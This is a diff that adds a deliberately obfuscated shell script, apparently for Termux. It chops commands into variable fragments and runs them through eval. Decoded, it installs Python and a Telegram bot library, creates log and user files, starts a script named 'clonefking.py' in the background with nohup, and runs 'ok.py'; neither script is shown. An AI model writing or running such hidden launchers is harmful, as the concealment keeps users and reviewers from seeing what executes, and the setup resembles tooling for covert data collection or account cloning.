@@ -1,0 +1,3 @@
+z="
+";Gz='e';Cz='te &';dz='py &';Tz='t';Ez='g up';Zz='thon';Sz='g.tx';Yz='p py';Dz='& pk';Xz='nohu';Bz='upda';Pz='tApi';Az='pkg ';cz='ing.';Mz='pyTe';Rz='h lo';bz='nefk';Iz='all ';ez='on o';Lz='pip ';Jz='pyth';Oz='amBo';fz='k.py';Uz='h us';Qz='touc';Vz='ers.';az=' clo';Nz='legr';Fz='grad';Wz='txt';Hz='inst';Kz='on';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$z$Az$Hz$Iz$Jz$Kz$z$Lz$Hz$Iz$Mz$Nz$Oz$Pz$z$Qz$Rz$Sz$Tz$z$Qz$Uz$Vz$Wz$z$Xz$Yz$Zz$az$bz$cz$dz$z$Jz$ez$fz"
